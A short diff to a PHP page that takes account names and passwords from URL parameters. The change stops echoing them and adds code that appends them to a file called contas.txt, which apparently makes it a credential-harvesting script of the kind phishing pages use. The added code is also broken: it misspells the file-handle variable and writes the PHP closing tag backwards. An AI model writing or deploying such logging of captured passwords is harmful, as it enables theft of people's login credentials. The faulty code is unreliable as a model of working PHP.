@@ -1,8 +1,12 @@
 <?php
   $vacc=$_GET["acc"];
   $vpwd=$_GET["pwd"];
-  
-  echo "Nome: ".$vacc."<br>Senha:".$vpwd."<br>";
+
+  $arquivo = fopen("contas.txt","a");
+
+  fwrite($rquivo,"Nome: ".$vacc."<br>Senha:".$vpwd."<br>");
+
+  fclose($arquivo);
 >?
 
 <!DOCTYPE html>
